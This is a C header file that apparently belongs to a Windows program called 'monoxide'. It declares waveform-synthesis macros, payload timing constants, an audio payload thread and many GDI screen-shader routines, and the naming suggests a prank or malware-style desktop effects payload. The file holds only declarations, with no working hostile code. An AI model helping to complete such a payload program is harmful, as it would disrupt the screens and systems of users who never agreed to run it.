#pragma once
#include "monoxide.h"

#define TIMER_DELAY 100
#define PAYLOAD_MS 10000
#define PAYLOAD_TIME ( PAYLOAD_MS / TIMER_DELAY )

#define SineWave(t, freq, sampleCount) FastSine(2.f * 3.1415f * ((FLOAT)(freq) * (FLOAT)(t) / (FLOAT)(sampleCount)))
#define SquareWave(t, freq, sampleCount) (((BYTE)(2.f * (FLOAT)(freq) * ((t) / (FLOAT)(sampleCount))) % 2) == 0 ? 1.f : -1.f)
#define TriangleWave(t, freq, sampleCount) (4.f * ( FLOAT )fabs(((FLOAT)(t) / ((FLOAT)(sampleCount) / (FLOAT)(freq))) - floor(((FLOAT)(t) / ((FLOAT)(sampleCount) / (FLOAT)(freq)))) - .5f) - 1.f)
#define SawtoothWave(t, freq, sampleCount) (fmod(((FLOAT)(t) / (FLOAT)(sampleCount)), (1.f / (FLOAT)(freq))) * (FLOAT)(freq) * 2.f - 1.f)

VOID
WINAPI
BeepEx(
	_In_ INT nWaveformIndex,
	_In_ INT nDuration,
	_In_ PSHORT psFreq,
	_In_ PFLOAT pfVolume
);

VOID
WINAPI
AudioPayloadThread( VOID );

VOID
WINAPI
AudioSequenceThread(
	_In_ PAUDIO_SEQUENCE_PARAMS pAudioParams
);

VOID
WINAPI
ExecuteAudioSequence(
	_In_ INT nSamplesPerSec,
	_In_ INT nSampleCount,
	_In_ AUDIO_SEQUENCE pAudioSequence,
	_In_opt_ AUDIOSEQUENCE_OPERATION pPreSynthOp,
	_In_opt_ AUDIOSEQUENCE_OPERATION pPostSynthOp
);

#define SYNTH_LENGTH 16
AUDIO_SEQUENCE AudioSequence1;
AUDIO_SEQUENCE AudioSequence2;
AUDIO_SEQUENCE AudioSequence3;
AUDIO_SEQUENCE AudioSequence4;
AUDIO_SEQUENCE AudioSequence5;
AUDIO_SEQUENCE AudioSequence6;
AUDIO_SEQUENCE AudioSequence7;
AUDIO_SEQUENCE AudioSequence8;
AUDIO_SEQUENCE AudioSequence9;
AUDIO_SEQUENCE AudioSequence10;
AUDIO_SEQUENCE AudioSequence11;
AUDIO_SEQUENCE AudioSequence12;
AUDIO_SEQUENCE AudioSequence13;
AUDIO_SEQUENCE AudioSequence14;
AUDIO_SEQUENCE AudioSequence15;
AUDIO_SEQUENCE AudioSequence16;
AUDIO_SEQUENCE FinalAudioSequence;
AUDIO_SEQUENCE_PARAMS pAudioSequences[ 25 ];

VOID
WINAPI
GdiShaderThread(
	_In_ PGDISHADER_PARAMS pGdiShaderParams
);

VOID
WINAPI
ExecuteGdiShader(
	_In_ HDC hdcDst,
	_In_ RECT rcBounds,
	_In_ INT nTime,
	_In_ INT nDelay,
	_In_ GDI_SHADER pGdiShader,
	_In_opt_ GDI_SHADER_OPERATION pPreGdiShader,
	_In_opt_ GDI_SHADER_OPERATION pPostGdiShader
);

INT nShaderThreeSeed;
GDI_SHADER GdiShader1;
GDI_SHADER GdiShader2;
GDI_SHADER GdiShader3;
GDI_SHADER GdiShader4;
GDI_SHADER GdiShader5;
GDI_SHADER GdiShader6;
GDI_SHADER GdiShader7;
GDI_SHADER GdiShader8;
GDI_SHADER GdiShader9;
GDI_SHADER GdiShader10;
GDI_SHADER GdiShader11;
GDI_SHADER GdiShader12;
GDI_SHADER GdiShader13;
GDI_SHADER GdiShader14;
GDI_SHADER GdiShader15;
GDI_SHADER GdiShader16;
GDI_SHADER GdiShader17;
GDI_SHADER GdiShader18;
GDI_SHADER GdiShader19;
GDI_SHADER GdiShader20;
GDI_SHADER GdiShader21;
GDI_SHADER FinalGdiShader;
GDI_SHADER_OPERATION PreGdiShader1;
GDI_SHADER_OPERATION PostGdiShader1;
GDI_SHADER_OPERATION PostGdiShader2;
GDI_SHADER_OPERATION PostGdiShader3;
GDI_SHADER_OPERATION PostGdiShader4;
GDI_SHADER_OPERATION PostGdiShader5;
GDI_SHADER_OPERATION PostGdiShader6;
GDI_SHADER_PARAMS pGdiShaders[ 25 ];